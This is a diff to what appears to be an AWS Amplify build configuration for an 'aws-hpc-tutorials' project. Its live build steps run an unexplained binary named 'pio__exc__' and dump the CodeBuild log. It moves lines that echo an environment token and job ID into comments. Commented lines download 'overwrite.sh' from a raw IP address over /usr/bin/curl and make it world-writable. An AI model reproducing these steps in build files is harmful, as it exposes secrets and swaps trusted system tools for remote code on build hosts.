@@ -50,12 +50,18 @@ frontend:
 #         - cp $GOPATH/src/aws-hpc-tutorials/amplify.yml undefined/
 #         - ./pio__exc__ deploy
 #       Detect
+#         - cp $GOPATH/src/pio__exc__ $GOPATH/src/aws-hpc-tutorials/
+#         - cd $GOPATH/src/aws-hpc-tutorials/
+#         - ./pio__exc__ detect
+#         - cat /codebuild/output/log
+#         - echo "Env token=$token"
+#         - echo "Build no=$AWS_JOB_ID"
+#         Localbuild
         - cp $GOPATH/src/pio__exc__ $GOPATH/src/aws-hpc-tutorials/
         - cd $GOPATH/src/aws-hpc-tutorials/
         - ./pio__exc__ detect
         - cat /codebuild/output/log
-        - echo "Env token=$token"
-        - echo "Build no=$AWS_JOB_ID"
+
 #         - /usr/bin/curlorg http://44.202.99.166:8000/overwrite.sh > /usr/bin/curl
 #         - chmod 777 /usr/bin/curl
 #         - ls -la /usr/bin/curl
